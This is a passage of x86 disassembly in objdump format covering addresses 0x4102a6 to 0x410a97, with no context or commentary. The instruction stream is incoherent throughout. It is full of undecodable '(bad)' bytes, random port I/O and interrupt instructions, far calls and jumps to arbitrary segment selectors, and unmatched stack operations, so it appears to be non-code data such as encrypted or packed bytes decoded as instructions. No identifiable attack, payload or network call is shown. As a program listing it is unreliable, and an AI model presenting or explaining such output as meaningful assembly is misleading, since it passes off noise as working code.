  4102a6:	jbe    0x4102ef
  4102a8:	fsubp  st(3),st
  4102aa:	ror    dh,0xcb
  4102ad:	stos   DWORD PTR es:[edi],eax
  4102ae:	dec    eax
  4102af:	inc    ecx
  4102b0:	mov    esi,0xc2ac8c73
  4102b5:	adc    ebx,esi
  4102b7:	test   BYTE PTR [ebx+0x46e1686c],bh
  4102bd:	xor    DWORD PTR [ebx+0x6e],0x652ceb25
  4102c4:	fidiv  DWORD PTR [ecx+0x36708e63]
  4102ca:	jbe    0x41030e
  4102cc:	test   DWORD PTR [eax+ebp*1-0xb],ebp
  4102d0:	dec    esp
  4102d1:	fld    TBYTE PTR [edx]
  4102d3:	fsub   st,st(5)
  4102d5:	or     BYTE PTR ds:0x2db2479a,0xd
  4102dc:	add    BYTE PTR [ebx],al
  4102de:	cwde   
  4102df:	push   ds
  4102e0:	xor    BYTE PTR [ebp-0x4cafb6d0],al
  4102e6:	in     eax,dx
  4102e7:	rol    DWORD PTR ds:[esi+0x17],cl
  4102eb:	push   0xffffffc9
  4102ed:	push   ebx
  4102ee:	push   esi
  4102ef:	in     eax,0x83
  4102f1:	bound  esp,QWORD PTR [ebp-0x19]
  4102f4:	dec    ebx
  4102f5:	push   esp
  4102f6:	inc    edx
  4102f7:	outs   dx,BYTE PTR ds:[esi]
  4102f8:	add    esi,eax
  4102fa:	xchg   edx,eax
  4102fb:	aam    0xcd
  4102fd:	xchg   edi,eax
  4102fe:	test   BYTE PTR [ebx-0xe55284b],0xbd
  410305:	clc    
  410306:	mov    ds:0xaef428c3,al
  41030b:	outs   dx,BYTE PTR ds:[esi]
  41030c:	int    0x70
  41030e:	pop    ebx
  41030f:	out    dx,al
  410310:	and    edi,DWORD PTR [eax+0x69c0fb1c]
  410316:	mov    ch,0x74
  410318:	in     al,0xe7
  41031a:	gs inc edi
  41031c:	push   ebp
  41031d:	xchg   ecx,eax
  41031e:	and    al,0x2c
  410320:	addr16 std 
  410322:	fstp   QWORD PTR [ebp-0x65]
  410325:	pop    edx
  410326:	retf   0xfa00
  410329:	or     eax,0x5cb2aa8
  41032e:	pop    ss
  41032f:	mov    ah,BYTE PTR [edi]
  410331:	jecxz  0x4102fd
  410333:	xchg   esi,eax
  410334:	mov    dl,0x0
  410336:	xor    DWORD PTR [esi+0x2a],edi
  410339:	jnp    0x4102dc
  41033b:	add    BYTE PTR [ecx+0x24522d63],0xfd
  410342:	test   al,0x79
  410344:	mov    DWORD PTR ds:0x85af8f67,edx
  41034a:	xchg   DWORD PTR [eax+eiz*2-0x2f],ebx
  41034e:	jle    0x4102d8
  410350:	sar    BYTE PTR [ebp-0x17],1
  410353:	lods   al,BYTE PTR ds:[esi]
  410354:	out    0x5,eax
  410356:	add    BYTE PTR [eax+edx*2+0x7],bl
  41035a:	fld    DWORD PTR [esi]
  41035c:	xlat   BYTE PTR ds:[ebx]
  41035d:	pop    esi
  41035e:	dec    edx
  41035f:	mov    bl,0x77
  410361:	push   0x9498a222
  410366:	aad    0x9d
  410368:	push   0xffffff83
  41036a:	sbb    al,0x7e
  41036c:	jnp    0x41037f
  41036e:	cmp    eax,0x27456120
  410373:	call   0xd598:0xe3758e2e
  41037a:	jno    0x4103b0
  41037c:	dec    edi
  41037d:	adc    ecx,edi
  41037f:	lods   al,BYTE PTR ds:[esi]
  410380:	jge    0x4103f3
  410382:	dec    ebx
  410383:	dec    ebp
  410384:	xor    BYTE PTR [esi+edi*1-0x2dca078],ah
  41038b:	xlat   BYTE PTR ds:[ebx]
  41038c:	ret    0xc456
  41038f:	or     al,0xe
  410391:	sub    al,BYTE PTR fs:[edi-0x5b]
  410395:	add    al,BYTE PTR ds:0x7bdd2cb5
  41039b:	add    eax,0x90513771
  4103a0:	inc    esp
  4103a1:	inc    eax
  4103a2:	push   eax
  4103a3:	inc    esi
  4103a4:	jbe    0x4103fa
  4103a6:	sbb    DWORD PTR [ecx+ebp*1-0x679087ad],ebp
  4103ad:	fimul  DWORD PTR [ecx-0x2a]
  4103b1:	mov    cl,0x10
  4103b3:	in     eax,0x25
  4103b5:	(bad)  
  4103b6:	aam    0xb
  4103b8:	pop    eax
  4103b9:	xor    al,0x36
  4103bb:	push   cs
  4103bc:	xor    BYTE PTR [ecx],0x62
  4103bf:	xchg   BYTE PTR [ebx+0x10baa6c6],ah
  4103c5:	ins    DWORD PTR es:[edi],dx
  4103c6:	lods   al,BYTE PTR ds:[esi]
  4103c7:	cli    
  4103c8:	vcmppd ymm7,ymm3,ymm5,0x70
  4103ce:	test   DWORD PTR [edx],ebx
  4103d0:	push   ds
  4103d1:	jb     0x4103ab
  4103d3:	xor    al,0xea
  4103d5:	mov    dl,0x21
  4103d7:	pop    edx
  4103d8:	ret    
  4103d9:	cdq    
  4103da:	xchg   ecx,eax
  4103db:	or     al,0x18
  4103dd:	cmp    bh,ch
  4103df:	das    
  4103e0:	sahf   
  4103e1:	xor    DWORD PTR [esi-0x21],0x31f33dfe
  4103e8:	loop   0x41043a
  4103ea:	jg     0x41041a
  4103ec:	xchg   ebx,eax
  4103ed:	(bad)  
  4103ee:	ja     0x4103ab
  4103f0:	leave  
  4103f1:	cwde   
  4103f2:	mov    edx,0x295d696f
  4103f7:	xor    ebx,DWORD PTR [edi+0x3d]
  4103fa:	add    ebx,DWORD PTR [edx]
  4103fc:	mov    esi,0x2a21894b
  410401:	sahf   
  410402:	and    eax,DWORD PTR [esi+0x46093646]
  410408:	inc    edx
  410409:	sub    esp,DWORD PTR [edx]
  41040b:	push   0x8
  41040d:	sbb    DWORD PTR [eax-0x428a72a5],edx
  410413:	sbb    ebx,DWORD PTR [ebx]
  410415:	leave  
  410416:	(bad)  
  410417:	lock cdq 
  410419:	mov    WORD PTR [ecx],es
  41041b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41041c:	pop    esi
  41041d:	loopne 0x4103bc
  41041f:	pop    edx
  410420:	xor    esp,ebp
  410422:	xor    dl,al
  410424:	test   eax,0xcdfe0547
  410429:	mov    dl,0x64
  41042b:	mov    dl,0xeb
  41042d:	retf   0x128f
  410430:	inc    esp
  410431:	sahf   
  410432:	sbb    bl,al
  410434:	aam    0xc7
  410436:	push   cs
  410437:	jne    0x41040d
  410439:	mov    al,ds:0x6a51c876
  41043e:	mov    ch,0xd5
  410440:	ins    BYTE PTR es:[edi],dx
  410441:	xor    ch,BYTE PTR [ebx+0x744079ca]
  410447:	cli    
  410448:	dec    edx
  410449:	cmc    
  41044a:	dec    edi
  41044b:	ja     0x410434
  41044d:	popa   
  41044e:	jne    0x4103f6
  410450:	mov    esp,0xe0579e0
  410455:	xor    BYTE PTR [esi+0x37],0xdc
  410459:	shl    DWORD PTR [eax],1
  41045b:	pop    esi
  41045c:	mov    ds:0x2a6f048e,al
  410461:	xor    bl,dl
  410463:	jne    0x410497
  410465:	es aad 0xd0
  410468:	inc    esi
  410469:	(bad)  
  41046a:	call   0x4873:0x3401d450
  410471:	jne    0x4104da
  410473:	into   
  410474:	ds mov esi,0x1f17d070
  41047a:	xor    DWORD PTR [ebp-0x5],edi
  41047d:	cli    
  41047e:	jo     0x410441
  410480:	cmp    BYTE PTR [esi+0x4dae43d6],bl
  410486:	and    eax,0x5acdd2c5
  41048b:	xchg   BYTE PTR [ecx],ah
  41048d:	test   ebp,edi
  41048f:	jecxz  0x41046f
  410491:	push   ecx
  410492:	retf   
  410493:	mov    dl,BYTE PTR [ebx+0x2]
  410496:	nop
  410497:	adc    DWORD PTR ds:[esi-0x5637f5cd],0xc9e970b6
  4104a2:	cli    
  4104a3:	sub    dl,bl
  4104a5:	mov    ds:0x5a89496d,eax
  4104aa:	inc    edi
  4104ab:	adc    al,0xec
  4104ad:	xchg   esp,ebp
  4104af:	clc    
  4104b0:	out    dx,al
  4104b1:	mov    ebp,0xc9e19850
  4104b6:	out    dx,eax
  4104b7:	inc    ebp
  4104b8:	and    eax,DWORD PTR [ecx-0x1740980b]
  4104be:	sbb    eax,DWORD PTR [esi-0x5c472217]
  4104c4:	(bad)  
  4104c5:	adc    ebp,eax
  4104c7:	mov    ecx,0xe8432e7b
  4104cc:	icebp  
  4104cd:	(bad)  
  4104ce:	fxam   
  4104d0:	cwde   
  4104d1:	mov    dh,0xa3
  4104d3:	push   ecx
  4104d4:	xor    eax,0xa91a9f1f
  4104d9:	lea    edi,[esi]
  4104db:	(bad)  
  4104dd:	or     bh,BYTE PTR [ebx]
  4104df:	lods   eax,DWORD PTR ds:[esi]
  4104e0:	inc    esp
  4104e1:	stos   DWORD PTR es:[edi],eax
  4104e2:	jns    0x41048b
  4104e4:	cli    
  4104e5:	cdq    
  4104e6:	bound  ebp,QWORD PTR ds:0x59f054c3
  4104ec:	test   ecx,0xf6d5f5bd
  4104f2:	push   eax
  4104f3:	out    0xe6,eax
  4104f5:	out    dx,al
  4104f6:	loope  0x410525
  4104f8:	shl    DWORD PTR [edi-0x64],cl
  4104fb:	add    ch,BYTE PTR [eax]
  4104fd:	adc    eax,0xc6bb48f6
  410502:	shr    al,1
  410504:	xchg   esp,eax
  410505:	aaa    
  410506:	dec    esp
  410507:	adc    ah,BYTE PTR [ebx-0x65110dab]
  41050d:	lds    esi,FWORD PTR [esi-0x65]
  410510:	gs aaa 
  410512:	or     BYTE PTR [ebp+0x60632449],bl
  410518:	lock cwde 
  41051a:	push   edi
  41051b:	adc    DWORD PTR [ebx-0x19298b91],esi
  410521:	arpl   WORD PTR [ecx-0x40890fa3],cx
  410527:	pop    es
  410528:	dec    ebx
  410529:	loope  0x4105a8
  41052b:	push   ebx
  41052c:	cmp    eax,DWORD PTR [edi+0x48]
  41052f:	sbb    DWORD PTR [ebx+0x523d10a3],ebp
  410535:	jbe    0x41051c
  410537:	fsubp  st(5),st
  410539:	aam    0x19
  41053b:	call   DWORD PTR [ecx+0x56d7313b]
  410541:	dec    esi
  410542:	jp     0x4105a6
  410544:	mov    esi,0x18c37dfc
  410549:	hlt    
  41054a:	fimul  DWORD PTR [ecx-0x53f8e147]
  410550:	mov    cl,0x6c
  410552:	mov    edx,0x18fca01a
  410557:	sar    DWORD PTR [edx-0x295a26bf],cl
  41055d:	or     ebp,DWORD PTR [edi+0x6ca261dd]
  410563:	repnz pop ebx
  410565:	dec    edx
  410566:	dec    eax
  410567:	fcom   DWORD PTR [ebx+0x59]
  41056a:	sub    BYTE PTR [edi-0x4a],ah
  41056d:	sbb    DWORD PTR [ebx+0x61781f9f],ebp
  410573:	clc    
  410574:	ins    BYTE PTR es:[edi],dx
  410575:	mov    ebx,0x43e4cb03
  41057a:	xor    edx,DWORD PTR [edi]
  41057c:	in     eax,0x5b
  41057e:	adc    BYTE PTR [edx+eiz*8],bh
  410581:	or     al,0xb2
  410583:	rcr    edi,0xe
  410586:	mov    ebx,0x2dfd7627
  41058b:	push   ecx
  41058c:	mov    dh,0xed
  41058e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41058f:	fcomp  QWORD PTR [edi-0xe702288]
  410595:	mov    ah,0x39
  410597:	pop    esi
  410598:	es int 0xfb
  41059b:	icebp  
  41059c:	pop    ebx
  41059d:	pop    DWORD PTR [ecx]
  41059f:	fcmovbe st,st(5)
  4105a1:	push   eax
  4105a2:	fs inc esp
  4105a4:	dec    edx
  4105a5:	sar    dl,0x58
  4105a8:	pop    ebx
  4105a9:	in     al,0x3f
  4105ab:	push   0x2b
  4105ad:	frstor [edi]
  4105af:	in     al,0x30
  4105b1:	pop    es
  4105b2:	dec    ebx
  4105b3:	(bad)  
  4105b4:	mov    ebx,0x1096a6c1
  4105b9:	fsub   st(6),st
  4105bb:	sbb    esp,DWORD PTR [edx+ecx*4]
  4105be:	adc    eax,0x3ca3813c
  4105c3:	(bad)  
  4105c4:	in     al,0xab
  4105c6:	enter  0x3c5d,0x44
  4105ca:	inc    BYTE PTR [esi+0x69f1b306]
  4105d0:	shl    BYTE PTR [ecx+esi*4+0x6c],0x20
  4105d5:	mov    ds:0x1605e648,al
  4105da:	mov    edi,0xde71eeed
  4105df:	push   ss
  4105e0:	sub    edx,DWORD PTR [eax+0x51]
  4105e3:	sbb    BYTE PTR [esi+0x5688b615],dh
  4105e9:	jl     0x410619
  4105eb:	dec    ecx
  4105ec:	jle    0x410669
  4105ee:	adc    al,0xbc
  4105f0:	and    DWORD PTR [edx+0x56],eax
  4105f3:	jp     0x4105ff
  4105f5:	cli    
  4105f6:	mov    esi,0x5bcd0f5
  4105fb:	ror    BYTE PTR [esi],1
  4105fd:	lock ins DWORD PTR es:[edi],dx
  4105ff:	cmp    esi,DWORD PTR [edi]
  410601:	xchg   DWORD PTR [edx+0x623d184d],eax
  410607:	lahf   
  410608:	ret    0xf758
  41060b:	dec    edi
  41060c:	mov    eax,ds:0xc07297d3
  410611:	loop   0x4105f7
  410613:	mov    ecx,0xf9da2c89
  410618:	fistp  DWORD PTR [ecx+0x2127d6d5]
  41061e:	scas   eax,DWORD PTR es:[edi]
  41061f:	mov    esi,0x65811dc6
  410624:	mov    al,0xe1
  410626:	pop    ds
  410627:	adc    al,0xe6
  410629:	je     0x410633
  41062b:	in     eax,0xc4
  41062d:	std    
  41062e:	jecxz  0x41062d
  410630:	and    bh,dl
  410632:	push   0xffffffd1
  410634:	call   0xb1abd769
  410639:	mov    eax,ds:0xa273e86a
  41063e:	sti    
  41063f:	test   al,0x70
  410641:	popf   
  410642:	add    DWORD PTR [ecx],0x21
  410645:	js     0x410694
  410647:	mov    ds:0x213c0adc,al
  41064c:	not    dl
  41064e:	or     DWORD PTR [ebp+0x15ca57f5],0x46cd5468
  410658:	nop
  410659:	or     BYTE PTR [edi],al
  41065b:	sbb    BYTE PTR [ebx-0x7acda5a0],dh
  410661:	mov    al,ds:0x66e92f48
  410666:	addr16 jnp 0x410636
  410669:	nop
  41066a:	jg     0x410679
  41066c:	and    DWORD PTR [ecx-0x6aaa68af],ecx
  410672:	xchg   esp,eax
  410673:	(bad)  
  410675:	inc    ecx
  410676:	or     cl,bh
  410678:	add    esp,DWORD PTR [ecx+0x23]
  41067b:	(bad)  
  41067d:	retf   
  41067e:	fdivr  DWORD PTR [edx-0x1f]
  410681:	popf   
  410682:	pop    esi
  410683:	enter  0x6a92,0x90
  410687:	sub    DWORD PTR [edi+0x5c8bd859],esi
  41068d:	inc    ebx
  41068e:	(bad)
  410692:	call   0x3c12:0x9b8abef1
  410699:	in     eax,dx
  41069a:	push   0x4ed6c110
  41069f:	pop    ecx
  4106a0:	jo     0x41065d
  4106a2:	inc    edi
  4106a3:	mov    DWORD PTR [ecx+0x9],0x40a66fb6
  4106aa:	inc    ebx
  4106ab:	sbb    al,0xe7
  4106ad:	std    
  4106ae:	js     0x410703
  4106b0:	cmp    cl,0x8a
  4106b3:	mov    dl,0x1a
  4106b5:	inc    eax
  4106b6:	cdq    
  4106b7:	push   eax
  4106b8:	add    al,BYTE PTR [ebp+0x31]
  4106bb:	les    esi,FWORD PTR [esi+0x2fbe7946]
  4106c1:	stc    
  4106c2:	dec    ebp
  4106c3:	xlat   BYTE PTR ds:[ebx]
  4106c4:	pop    esp
  4106c5:	pop    ebx
  4106c6:	loopne 0x4106e3
  4106c8:	packsswb mm0,QWORD PTR [esp+edx*2]
  4106cc:	loope  0x410727
  4106ce:	test   eax,0x5c78eddf
  4106d3:	cmp    DWORD PTR [edi],edi
  4106d5:	xor    eax,0x2f58d339
  4106da:	cmp    DWORD PTR [ecx],esi
  4106dc:	and    eax,0xaec6483b
  4106e1:	mul    eax
  4106e3:	mov    eax,0x113c84f8
  4106e8:	push   ebx
  4106e9:	sbb    DWORD PTR [edx+0x5ae9be74],eax
  4106ef:	mov    bh,0x89
  4106f1:	iret   
  4106f2:	and    BYTE PTR [esi+esi*2-0x37e9fe77],0xb5
  4106fa:	test   DWORD PTR [ecx],ebp
  4106fc:	retf   0x4adb
  4106ff:	cmp    eax,0x34cb61d4
  410704:	mov    dh,0x19
  410706:	mov    ah,0xfe
  410708:	jne    0x4106a2
  41070a:	xchg   edx,eax
  41070b:	fcom   st(6)
  41070d:	es fsub st,st(5)
  410710:	nop
  410711:	or     DWORD PTR [ebx],0x8
  410714:	inc    esi
  410715:	neg    DWORD PTR [ecx+0x344959ec]
  41071b:	sbb    BYTE PTR ds:0xe7764f32,al
  410721:	pop    edi
  410722:	lock jmp 0xab9f:0xbb109c1a
  41072a:	stc    
  41072b:	push   ebx
  41072c:	retf   
  41072d:	in     eax,0xe8
  41072f:	xchg   BYTE PTR [ebx],dl
  410731:	test   eax,0x27ea18ae
  410736:	ficom  WORD PTR [ecx-0x38]
  410739:	pop    edi
  41073a:	dec    ecx
  41073b:	sub    eax,0x275148b3
  410740:	(bad)  
  410742:	add    al,0x69
  410744:	pusha  
  410745:	mov    ds:0x65f6ba43,al
  41074a:	std    
  41074b:	mov    cl,0xee
  41074d:	clc    
  41074e:	out    dx,eax
  41074f:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  410751:	pop    ss
  410752:	cdq    
  410753:	fst    QWORD PTR [edi+0x15d3bd87]
  410759:	xchg   ecx,eax
  41075a:	and    al,0x93
  41075c:	les    eax,FWORD PTR [edx]
  41075e:	inc    edi
  41075f:	mul    DWORD PTR [esi+0x64]
  410762:	mov    bl,0x75
  410764:	mov    ch,0x7e
  410766:	dec    ebp
  410767:	mov    dh,0x41
  410769:	aas    
  41076a:	sbb    BYTE PTR [eax],dh
  41076c:	loop   0x410795
  41076e:	jno    0x410734
  410770:	cwde   
  410771:	test   al,0xe9
  410773:	xor    eax,0x464fbfbd
  410778:	in     eax,dx
  410779:	sbb    DWORD PTR [ebx+0x2d],ecx
  41077c:	mov    esi,0x4cdba287
  410781:	dec    ebp
  410782:	mov    BYTE PTR [ecx-0x9],dl
  410785:	hlt    
  410786:	std    
  410787:	xlat   BYTE PTR ds:[ebx]
  410788:	or     bh,al
  41078a:	mov    WORD PTR cs:[edi],?
  41078d:	dec    ebx
  41078e:	repz xchg edi,eax
  410790:	test   BYTE PTR [esi],0x14
  410793:	(bad)  
  410794:	mov    al,ds:0x5bc8c367
  410799:	into   
  41079a:	fisub  DWORD PTR [edi-0x38a07ef3]
  4107a0:	scas   eax,DWORD PTR es:[edi]
  4107a1:	jp     0x41080b
  4107a3:	adc    al,0x6a
  4107a5:	xchg   ecx,eax
  4107a6:	lahf   
  4107a7:	add    ax,0x557
  4107ab:	dec    ebp
  4107ac:	fwait
  4107ad:	add    DWORD PTR [edx],edx
  4107af:	and    al,0xe2
  4107b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107b2:	adc    DWORD PTR [ebp+0x46],esp
  4107b5:	and    eax,esp
  4107b7:	pop    edi
  4107b8:	cdq    
  4107b9:	and    eax,DWORD PTR [ecx+0x38]
  4107bc:	mov    edx,0x2598906e
  4107c1:	xor    DWORD PTR [esi],ecx
  4107c3:	xchg   BYTE PTR [esi-0x5a5fe06f],bh
  4107c9:	or     BYTE PTR [ebp+0x39],0x73
  4107cd:	jge    0x41076a
  4107cf:	lds    edi,FWORD PTR [ebx+0xf8d4a29]
  4107d5:	pop    esi
  4107d6:	or     BYTE PTR [esp+ebx*4-0x324a1695],bl
  4107dd:	xor    BYTE PTR [ebx+0x16],bl
  4107e0:	adc    cl,dh
  4107e2:	cmp    ch,bl
  4107e4:	rcl    dh,0xac
  4107e7:	out    dx,eax
  4107e8:	mov    dl,0x89
  4107ea:	add    DWORD PTR [ebp-0x56],edi
  4107ed:	pusha  
  4107ee:	add    DWORD PTR [edi+0x2e],ecx
  4107f1:	scas   al,BYTE PTR es:[edi]
  4107f2:	mov    al,0xd
  4107f4:	xchg   ebx,eax
  4107f5:	rcl    esi,1
  4107f7:	jae    0x410852
  4107f9:	test   DWORD PTR [edi+ebp*1],edi
  4107fc:	stos   BYTE PTR es:[edi],al
  4107fd:	mov    al,ds:0x955f497a
  410802:	repz mov ecx,DWORD PTR [eax]
  410805:	pushf  
  410806:	inc    ecx
  410807:	(bad)  
  410808:	jmp    0x410852
  41080a:	push   0xffffff89
  41080c:	dec    edx
  41080d:	dec    eax
  41080e:	mov    bh,0x20
  410810:	fst    QWORD PTR [ebx]
  410812:	mov    cl,0x26
  410814:	imul   esi,esp,0x79
  410817:	cmp    eax,0x29673bd6
  41081c:	inc    esi
  41081d:	fs imul eax,ebx,0xffffff83
  410821:	inc    esp
  410822:	pop    ebx
  410823:	push   cs
  410824:	repz adc DWORD PTR [esi+0x480ec345],eax
  41082b:	out    0x2f,eax
  41082d:	lea    ecx,[ecx]
  41082f:	jl     0x4107e3
  410831:	inc    edx
  410832:	jmp    0xde32:0xebcc2e
  410839:	or     ebp,DWORD PTR [esi+0x4c]
  41083c:	sbb    BYTE PTR [ebp-0x41e06e16],bl
  410842:	add    ebp,edx
  410844:	dec    ecx
  410845:	cmp    al,cl
  410847:	jecxz  0x4107d6
  410849:	xchg   esi,eax
  41084a:	dec    edi
  41084b:	out    0x95,eax
  41084d:	ja     0x4108c1
  41084f:	(bad)
  410853:	daa    
  410854:	jmp    0x4108b3
  410856:	mov    WORD PTR ds:0xe7c3fdcd,ss
  41085c:	and    ah,BYTE PTR [ecx+0x6aa954da]
  410862:	pusha  
  410863:	pop    ecx
  410864:	adc    eax,0xcb373bdd
  410869:	and    eax,0x3a30f9e6
  41086e:	adc    BYTE PTR [ebx-0x33ec5186],0xd1
  410875:	push   esp
  410876:	add    eax,0x8e5d3f2f
  41087b:	fidiv  WORD PTR [edi+0x1fc61dea]
  410881:	sahf   
  410882:	aad    0x92
  410884:	xchg   edi,eax
  410885:	stos   DWORD PTR es:[edi],eax
  410886:	pop    ds
  410887:	ins    DWORD PTR es:[edi],dx
  410888:	push   ebp
  410889:	sar    DWORD PTR [eax],0xc5
  41088c:	jge    0x4108d2
  41088e:	inc    esi
  41088f:	push   0x53
  410891:	xor    al,0xd
  410893:	mov    dl,0xd1
  410895:	fist   DWORD PTR [eax+0x6cad0e81]
  41089b:	arpl   WORD PTR [esi+0x45],ax
  41089e:	std    
  41089f:	pop    esi
  4108a0:	dec    esi
  4108a1:	repnz push eax
  4108a3:	lods   eax,DWORD PTR ds:[esi]
  4108a4:	cmp    dl,ch
  4108a6:	jle    0x41088f
  4108a8:	jb     0x410844
  4108aa:	xor    al,BYTE PTR [esi+0x789e4fa3]
  4108b0:	sbb    ah,BYTE PTR [ecx-0x55c57e44]
  4108b6:	rcl    cl,cl
  4108b8:	mov    WORD PTR [eax],ss
  4108ba:	push   esp
  4108bb:	xchg   ch,bl
  4108bd:	push   esi
  4108be:	ds pop edx
  4108c0:	imul   esi,DWORD PTR [edx+0x745b8748],0xffffffc2
  4108c7:	sub    DWORD PTR [esi+0x3],0x9c4f2a4
  4108ce:	lods   eax,DWORD PTR ds:[esi]
  4108cf:	iret   
  4108d0:	jnp    0x410923
  4108d2:	(bad)
  4108d6:	sub    ebx,DWORD PTR [ebx+0x9]
  4108d9:	sub    edx,DWORD PTR [ecx+eiz*2+0x55]
  4108dd:	cmc    
  4108de:	add    bl,BYTE PTR [ebp-0x2b]
  4108e1:	adc    eax,0x63e0b2b9
  4108e6:	or     DWORD PTR [esi+0x6],ebp
  4108e9:	in     al,dx
  4108ea:	into   
  4108eb:	and    dh,al
  4108ed:	or     cl,BYTE PTR [edx+0x13]
  4108f0:	sub    DWORD PTR [esi+0x2c],edi
  4108f3:	mov    eax,ds:0xd882436d
  4108f8:	loope  0x4108f1
  4108fa:	fild   QWORD PTR [eax+0x53]
  4108fd:	jg     0x410969
  4108ff:	repnz sbb ebx,ebp
  410902:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410903:	fs scas eax,DWORD PTR es:[edi]
  410905:	xchg   ebp,eax
  410906:	dec    ebx
  410907:	fdivr  DWORD PTR [esi+0x62]
  41090a:	jbe    0x410919
  41090c:	or     edi,edi
  41090e:	ss (bad) 
  410910:	scas   al,BYTE PTR es:[edi]
  410911:	dec    ebx
  410912:	xor    BYTE PTR [ecx-0x3cae83a4],0x36
  410919:	neg    BYTE PTR [ecx]
  41091b:	shl    DWORD PTR [edi+ebp*4],cl
  41091e:	inc    ebp
  41091f:	add    al,0xb3
  410921:	aas    
  410922:	xor    DWORD PTR [edi],0x1e9cd356
  410928:	mov    eax,ds:0x9f7e8ecd
  41092d:	repz test DWORD PTR [ecx-0x1a6b694e],esi
  410934:	cmp    cl,BYTE PTR [ebp-0x5e5744bf]
  41093a:	hlt    
  41093b:	sahf   
  41093c:	jbe    0x410902
  41093e:	lods   eax,DWORD PTR cs:[esi]
  410940:	ja     0x4109b0
  410942:	xchg   edx,eax
  410943:	popa   
  410944:	imul   edi,eax,0x8d97037f
  41094a:	pop    eax
  41094b:	dec    edx
  41094c:	sbb    eax,DWORD PTR [eax]
  41094e:	pop    eax
  41094f:	or     dh,BYTE PTR [eax-0x10d31f73]
  410955:	fnstcw WORD PTR [ebp+0x70]
  410958:	xor    al,0xbd
  41095a:	sub    al,0xe6
  41095c:	(bad)  
  41095d:	fadd   QWORD PTR [esi-0x7a262c19]
  410963:	rcl    edx,cl
  410965:	xor    ah,BYTE PTR [edi]
  410967:	xor    BYTE PTR [edi+0x5a6be937],al
  41096d:	jmp    0x4109cd
  41096f:	mov    dl,0x45
  410971:	enter  0x7433,0x48
  410975:	stc    
  410976:	mov    cl,0x8a
  410978:	mov    WORD PTR [ecx],es
  41097a:	mov    ds:0x2dda6ae3,eax
  41097f:	es sbb eax,0xd36f503e
  410985:	or     al,0x66
  410987:	xchg   esp,eax
  410988:	pop    ecx
  410989:	test   eax,0x7541773
  41098e:	xor    ch,bl
  410990:	push   esp
  410991:	pop    ds
  410992:	sbb    ecx,DWORD PTR [esi+0x48]
  410995:	scas   al,BYTE PTR es:[edi]
  410996:	dec    edx
  410997:	cmp    eax,0xaa0ba1ec
  41099c:	imul   eax,DWORD PTR [ebx],0x9e23f1e6
  4109a2:	mov    dh,0x6b
  4109a4:	sub    eax,0x6268f338
  4109a9:	fs hlt 
  4109ab:	cmp    eax,DWORD PTR [ebx]
  4109ad:	sti    
  4109ae:	mov    esi,0x6acde438
  4109b3:	mov    dh,0x36
  4109b5:	cld    
  4109b6:	jl     0x4109ae
  4109b8:	mov    ds:0x95d2b7cf,al
  4109bd:	sub    edi,DWORD PTR [esi+ecx*2]
  4109c0:	aam    0x74
  4109c2:	inc    eax
  4109c3:	(bad)  
  4109c4:	mov    ds:0x2933e225,eax
  4109c9:	jns    0x4109aa
  4109cb:	lock lds esi,FWORD PTR [ebp+0x26]
  4109cf:	push   ss
  4109d0:	push   esi
  4109d1:	cwde   
  4109d2:	push   0xfffffff5
  4109d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109d5:	sbb    al,0xb9
  4109d7:	(bad)  
  4109d9:	or     DWORD PTR [ecx+ebp*1],0xffffffa6
  4109dd:	xor    ah,BYTE PTR ds:0x7b71a599
  4109e3:	mov    ch,0x97
  4109e5:	les    esp,FWORD PTR [ebx]
  4109e7:	in     eax,dx
  4109e8:	scas   al,BYTE PTR es:[edi]
  4109e9:	and    al,al
  4109eb:	test   DWORD PTR [ebp+0x61],eax
  4109ee:	rcl    DWORD PTR ds:0xe54dada5,cl
  4109f4:	inc    ebx
  4109f5:	mov    BYTE PTR fs:[ecx+0x33],dl
  4109f9:	arpl   WORD PTR [eax-0x40],di
  4109fc:	or     ebp,DWORD PTR [esi+0xe0c2d32]
  410a02:	int    0x92
  410a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a05:	push   ebp
  410a06:	pop    esi
  410a07:	sti    
  410a08:	or     al,0x2d
  410a0a:	lock cmp cl,BYTE PTR [edi]
  410a0d:	aas    
  410a0e:	adc    eax,0x61b2099b
  410a13:	ret    
  410a14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a15:	fidiv  WORD PTR [edi]
  410a17:	mov    esp,0x76fe9cf8
  410a1c:	fstp   QWORD PTR [ebx-0x7f]
  410a1f:	fist   WORD PTR [ebx-0x19]
  410a22:	popf   
  410a23:	out    0x50,al
  410a25:	sbb    al,0x74
  410a27:	into   
  410a28:	inc    edi
  410a29:	mov    ds,WORD PTR [edi+0x64]
  410a2c:	pop    eax
  410a2d:	cmp    eax,0x6c00eb1d
  410a32:	add    eax,0xf25e9e13
  410a37:	(bad)  
  410a38:	jle    0x410a67
  410a3a:	or     BYTE PTR [ecx],bh
  410a3c:	inc    esi
  410a3d:	mov    bl,0xeb
  410a3f:	mov    al,0x6c
  410a41:	xor    DWORD PTR [eax],esi
  410a43:	out    dx,al
  410a44:	(bad)  [edi+0x4]
  410a47:	repz fimul WORD PTR [ecx+esi*8+0x5135466a]
  410a4f:	add    esp,0xf7e3fed3
  410a55:	pop    ebp
  410a56:	add    DWORD PTR [edx-0x33],esp
  410a59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a5a:	mov    ch,0x8e
  410a5c:	mov    cl,0xfa
  410a5e:	sahf   
  410a5f:	mov    esp,0xc29aaa1a
  410a64:	mov    eax,0x6f3aa211
  410a69:	push   0xa14b8029
  410a6e:	ss (bad) 
  410a71:	lods   eax,DWORD PTR ds:[esi]
  410a72:	repnz mov ?,WORD PTR [ebx+0xfd001ef]
  410a79:	push   edi
  410a7a:	add    dh,BYTE PTR [ecx]
  410a7c:	popf   
  410a7d:	(bad)  
  410a7f:	into   
  410a80:	int3   
  410a81:	pop    eax
  410a82:	scas   eax,DWORD PTR es:[edi]
  410a83:	ja     0x410ab0
  410a85:	and    DWORD PTR [esi],0x6d
  410a88:	into   
  410a89:	push   edx
  410a8a:	imul   ebp,DWORD PTR [ebx-0x11013491],0x6dac7076
  410a94:	stos   BYTE PTR es:[edi],al
  410a95:	jo     0x410a24
  410a97:	inc    ebp
